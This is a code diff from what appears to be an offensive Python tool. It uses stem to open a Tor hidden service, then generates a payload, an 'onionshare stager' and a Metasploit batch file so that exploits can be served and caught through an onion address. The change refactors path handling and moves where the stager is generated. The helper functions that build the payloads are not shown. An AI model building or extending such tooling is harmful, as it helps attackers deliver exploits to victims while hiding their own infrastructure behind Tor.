@@ -6,7 +6,7 @@ import shutil
 import signal
 from stem.control import Controller
 from subprocess import check_output
-from helpers import generate_onionshare_stager, generate_rc_payload, generate_msfc_batch
+from helpers import generate_onionshare_stagger, generate_rc_payload, generate_msfc_batch, get_public_resources
 
 
 def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost=None, output=None, onion_ftp=False):
@@ -37,25 +37,25 @@ def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost
         except:
             print("[!] Unable to connect ! Is tor running and dir writable? Exiting..")
             exit(0)
-
-        # Check if onion_ftp is needed
-        if onion_ftp:
-            generate_onionshare_stager(os.getcwd() + '/public/px.rdx')
         # The hostname is only available when we can read the hidden service
         # directory. This requires us to be running with the same user as tor process.
         if result.hostname:
+            resource_abspath = get_public_resources(output)
+            payload_abspath = get_public_resources(payload)
             print(" * Service is available at %s redirecting to local port %d" % (result.hostname, lport))
             # Generate payload
-            generate_rc_payload(result.hostname, payload, output)
+            generate_rc_payload(result.hostname, payload_abspath, resource_abspath)
+            # Check if onion_ftp is needed
+            if onion_ftp:
+                generate_onionshare_stagger(resource_abspath)
             # Generate metasploit batch file
-            generate_msfc_batch(exploit, payload, lhost, lport)
+            generate_msfc_batch(exploit, payload_abspath, lhost, lport)
             print('\n')
         else:
             print(
                 "* Unable to determine our service's hostname, probably due to being unable to read the hidden "
                 "service directory. Exiting..")
             exit(0)
-
         try:
             input("\x1b[6;30;42m * RUNNING - <enter> to quit\x1b[0m")
         finally:
